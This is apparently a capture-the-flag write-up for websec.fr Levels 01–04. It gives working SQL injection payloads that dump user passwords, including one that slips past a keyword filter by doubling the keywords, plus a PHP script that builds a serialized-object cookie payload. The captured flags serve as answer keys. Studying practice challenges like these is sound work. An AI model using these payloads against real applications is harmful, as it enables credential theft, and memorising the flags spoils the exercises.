**[Level01](http://websec.fr/level01/)**  
Using GROUP_CONCAT
```
-1 UNION SELECT 'a', GROUP_CONCAT(password) FROM users;--
```
```
WEBSEC{Simple_SQLite_Injection}
```
**[Level02](http://websec.fr/level02/)**  
It's same Level01 but filtered by the application using preg_replace()
```
$searchWords = implode (['union', 'order', 'select', 'from', 'group', 'by'], '|');
$injection = preg_replace ('/' . $searchWords . '/i', '', $injection);
```
It replace 'union', 'order', 'select', 'from', 'group', 'by' to '', so we try
```
-1 UUNIONNION SSELECTELECT 'a', GGROUPROUP_CONCAT(password) FFROMROM users;--
```
```
WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}
```
**[Level03](http://websec.fr/level03/)**  
It's using <i>password_hash</i> and <i>password_verify</i>, but the hash string is special, it start with <i>7c00</i>
```
7c00249d409a91ab84e3f421c193520d9fb3674b
```

**[Level04](http://websec.fr/level04/)**  
We can Deserialization by create same class
```
<?php

class SQL {
    public $query = '';
    public $conn;
    public function __construct() {
    }
    
    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query);
    }

    public function __destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
}
$newSQL = new SQL();
$newSQL->query = "SELECT password AS username FROM users"; // because it take $row['username']
echo base64_encode (serialize($newSQL));
?>
TzozOiJTUUwiOjI6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBBUyB1c2VybmFtZSBGUk9NIHVzZXJzIjtzOjQ6ImNvbm4iO047fQ
```
Change cookie <i>leet_hax0r</i> we got
```
WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}
```

**[Level05](http://websec.fr/level05/)**  